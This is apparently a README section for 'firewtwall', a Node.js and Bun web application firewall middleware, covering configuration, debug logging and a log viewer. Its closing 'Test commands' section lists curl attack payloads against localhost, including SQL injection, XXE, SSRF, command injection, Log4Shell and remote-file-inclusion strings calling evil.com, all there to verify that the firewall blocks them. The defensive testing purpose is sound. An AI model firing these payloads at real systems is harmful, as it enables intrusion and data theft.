## Node.js & Bun

### Quick start

**npm:**
```bash
npm install firewtwall
```

**Bun:**
```bash
bun add firewtwall
```

**Example (works with both):**
```bash
const express = require('express');
const { createWAF } = require('firewtwall');

const app = express();

// Parse body BEFORE the WAF so it can inspect request data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Mount the WAF — spread the returned middleware array
app.use(...createWAF());

app.get('/', (req, res) => res.json({ ok: true }));
app.listen(3000);
```

---

### Bun runtime

fireWTwall fully supports [Bun](https://bun.sh) — a fast JavaScript runtime that's fully compatible with Node.js APIs.

**Run with Bun:**
```bash
bun example/server.js
```

**Performance benefits:**
- Faster startup than Node.js
- Lower memory footprint
- Identical security protection
- No code changes needed

See [docs/nodejs/bun.md](docs/nodejs/bun.md) for complete Bun documentation.

---

### All options

```js
const { createWAF, setStore } = require('firewtwall');

app.use(...createWAF({
  mode: 'reject',              // 'reject' | 'log-only'
  rateLimit: {
    windowMs:        60_000,   // 1-minute sliding window
    maxRequests:     100,      // max requests per window per IP
    blockDurationMs: 600_000,  // 10-minute block after violation
  },
  whitelist:      ['127.0.0.1', '10.0.0.0/8'],  // bypass all checks
  blacklist:      ['203.0.113.0/24'],            // always block
  bypassPaths:    ['/health', '/metrics'],       // skip WAF entirely
  trustedProxies: ['172.16.0.1'],               // honour X-Forwarded-For
  logPath:        './logs/waf.log',             // NDJSON log
  responseType:   'json',                       // 'json' | 'html'
  debug:          false,                        // see Debug mode below
}));
```

---

### Debug mode

```js
app.use(...createWAF({ debug: true }));
```

When `debug: true` every request — pass **and** block — is fully traced:

| What changes | Detail |
|---|---|
| **All requests logged** | Every request lands in the NDJSON log with processing time and checks run |
| **X-WAF-\* response headers** | Four headers expose the outcome to the caller |
| **Verbose log fields** | Raw matched value, decoded value, and exact rule name are included |

**Response headers in debug mode:**

| Header | Example value | Present |
|--------|--------------|---------|
| `X-WAF-RequestId` | `f47ac10b58cc1122` | Always |
| `X-WAF-Result` | `passed` or `blocked` | Always |
| `X-WAF-Rule` | `sql-union-select` | Blocked only |
| `X-WAF-Time` | `0.83ms` | Always |

**Passed request — log entry:**
```json
{
  "timestamp": "2026-03-30T10:00:00Z",
  "requestId": "f47ac10b58cc1122",
  "ip": "127.0.0.1",
  "method": "GET",
  "path": "/",
  "result": "passed",
  "processingTimeMs": 0.42,
  "checksRun": 16
}
```

**Blocked request — log entry:**
```json
{
  "timestamp": "2026-03-30T10:00:01Z",
  "requestId": "a1b2c3d4e5f6a7b8",
  "ip": "203.0.113.42",
  "method": "GET",
  "path": "/search",
  "result": "blocked",
  "rule": "sql-union-select",
  "matched": "UNION SELECT",
  "decoded": "UNION SELECT",
  "source": "query",
  "severity": "critical",
  "processingTimeMs": 0.83,
  "userAgent": "sqlmap/1.7"
}
```

**Catch nmap in debug mode:**
```bash
# Fire nmap at your dev server
nmap -sV localhost -p 3000

# See the blocked probe in the log
npx waf-log --blocked --rule nmap
```

> ⚠️ **Never use `debug: true` in production** — it leaks internal rule names to the caller.

---

### Log viewer CLI

```bash
# Last 50 entries (default)
npx waf-log

# Last 100 entries from a custom log file
npx waf-log --tail 100 ./logs/waf.log

# Stats — top rules, top IPs, severity breakdown
npx waf-log --stats

# Only blocked requests
npx waf-log --blocked

# Filter by IP or rule (partial match)
npx waf-log --ip 203.0.113.42
npx waf-log --rule sql

# Entries after a timestamp
npx waf-log --since 2026-03-30T00:00:00Z

# Raw NDJSON — pipe-friendly
npx waf-log --json | jq .
```

---

### Redis / multi-process

Replace the built-in in-memory store with any key-value backend:

```js
const { createWAF, setStore } = require('firewtwall');
const redis = require('ioredis');

const client = new redis();

setStore({
  get: async (key)        => JSON.parse(await client.get(key) ?? 'null'),
  set: async (key, value) => client.set(key, JSON.stringify(value)),
  del: async (key)        => client.del(key),
});

app.use(...createWAF());
```

---

### Configuration reference

| Key | Default | Description |
|-----|---------|-------------|
| `mode` | `'reject'` | `'reject'` blocks · `'log-only'` audits |
| `allowedMethods` | `['GET','POST','PUT','PATCH','DELETE','OPTIONS','HEAD']` | Permitted HTTP verbs |
| `maxBodySize` | `10485760` | Max `Content-Length` in bytes (10 MB) |
| `rateLimit.windowMs` | `60000` | Sliding-window duration in ms |
| `rateLimit.maxRequests` | `100` | Requests allowed per window per IP |
| `rateLimit.blockDurationMs` | `600000` | Block duration after violation |
| `whitelist` | `[]` | IPs / CIDRs that bypass all checks |
| `blacklist` | `[]` | IPs / CIDRs that are always blocked |
| `bypassPaths` | `['/health','/ping']` | Paths that skip all WAF checks |
| `trustedProxies` | `[]` | Enable `X-Forwarded-For` parsing |
| `logPath` | `'./logs/waf.log'` | NDJSON log file path |
| `responseType` | `'json'` | Block response: `'json'` or `'html'` |
| `debug` | `false` | Full request tracing + `X-WAF-*` headers |

---

### TypeScript

Types ship with the package — no `@types/` install needed:

```ts
import { createWAF, setStore, WAFOptions, StoreAdapter } from 'firewtwall';

const opts: WAFOptions = {
  mode: 'reject',
  debug: false,
  blacklist: ['203.0.113.0/24'],
};

app.use(...createWAF(opts));
```

---

### Test commands

```bash
# SQL injection → 403
curl "http://localhost:3000/?q=1+UNION+SELECT+*+FROM+users"

# XSS → 403
curl "http://localhost:3000/?q=<script>alert(1)</script>"

# Path traversal → 403
curl "http://localhost:3000/?file=../../etc/passwd"

# Command injection → 403
curl "http://localhost:3000/?cmd=|cat+/etc/passwd"

# CRLF injection → 400
curl -H $'X-Header: foo\r\nInjected: bar' http://localhost:3000/

# SSRF — cloud metadata → 403
curl "http://localhost:3000/?url=http://169.254.169.254/latest/meta-data"

# SSRF — private IP → 403
curl "http://localhost:3000/?redirect=http://192.168.1.1/admin"

# XXE — external entity → 403
curl -X POST http://localhost:3000/upload \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>'

# Open redirect → 403
curl "http://localhost:3000/login?returnUrl=//evil.com"

# Prototype pollution → 403
curl "http://localhost:3000/?__proto__[admin]=true"

# Log4Shell (CVE-2021-44228) — scanned in every header → 403
curl -H 'User-Agent: ${jndi:ldap://evil.com/a}' http://localhost:3000/

# Log4Shell obfuscated variant → 403
curl -H 'X-Api-Version: ${${lower:j}ndi:ldap://evil.com/a}' http://localhost:3000/

# Shellshock (CVE-2014-6271) — any header → 403
curl -H 'User-Agent: () { :; }; /bin/bash -c "id"' http://localhost:3000/

# SSTI — Jinja2/Python → 403
curl "http://localhost:3000/?name={{__class__.__mro__}}"

# SSTI — Twig → 403
curl "http://localhost:3000/?tpl={{_self.env.registerUndefinedFilterCallback('exec')}}"

# SSTI — Struts2/OGNL → 403
curl "http://localhost:3000/?redirect=%{#a=new+java.lang.ProcessBuilder({'id'}).start()}"

# Remote file inclusion → 403
curl "http://localhost:3000/?file=http://evil.com/shell.php"

# NoSQL injection — MongoDB $ne → 403
curl "http://localhost:3000/login?user[$ne]=x&pass[$ne]=x"

# NoSQL injection — JSON body → 403
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"user": {"$ne": null}, "pass": {"$ne": null}}'

# LDAP injection → 403
curl "http://localhost:3000/search?user=*)(uid=*))(|(uid=*"

# PHP deserialization → 403
curl "http://localhost:3000/?data=O:8:\"stdClass\":0:{}"

# Java deserialization (base64 magic) → 403
curl "http://localhost:3000/?payload=rO0ABXNy"

# Bad bot (Metasploit) → 403
curl -A "msf/1.0" http://localhost:3000/

# Bad bot (tplmap) → 403
curl -A "tplmap/0.5" http://localhost:3000/

# Clean request → 200
curl http://localhost:3000/
```

---
<br />
<br />

`saarors😏`
